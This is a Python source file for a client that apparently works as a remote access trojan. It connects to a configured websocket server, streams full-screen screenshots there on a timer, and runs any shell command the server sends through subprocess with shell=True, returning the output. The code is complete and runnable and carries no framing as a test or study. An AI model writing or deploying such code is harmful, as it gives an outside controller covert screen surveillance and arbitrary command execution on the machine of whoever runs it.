import io
import subprocess
import pyscreenshot as ImageGrab
import websockets
import asyncio
import base64
import json

from datetime import datetime

import config


async def send_screenshot(websocket):
    while True:
        now = datetime.now()

        created = now.isoformat()
        filename = now.strftime("%Y-%m-%d_%H-%M-%S")

        # take screenshot
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")

        image_data = base64.b64encode(img_bytes.getvalue()).decode("utf-8")

        data = json.dumps(
            {
                "screenshot": {
                    "image": image_data,
                    "created": created,
                    "filename": filename,
                }
            }
        )

        await websocket.send(data)
        await asyncio.sleep(config.SHOT_TIME)


async def run_command(command):
    return subprocess.run(
        command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True
    ).stdout


async def receive_message(websocket):
    while True:
        async for message in websocket:
            message = json.loads(message)
            if message.get("command"):
                command = message.get("command")
                data = json.dumps(
                    {
                        "result_command": await run_command(command),
                    }
                )
                await websocket.send(data)


async def main(websocket):
    send_task = asyncio.create_task(send_screenshot(websocket))
    receive_task = asyncio.create_task(receive_message(websocket))
    await asyncio.gather(send_task, receive_task)


async def connect_and_run():
    async with websockets.connect(
        config.WEBSOCKET_URL,
        extra_headers={
            "auth": f"{config.USERNAME}:{config.PASSWORD}",
        },
    ) as websocket:
        await main(websocket)


asyncio.run(connect_and_run())
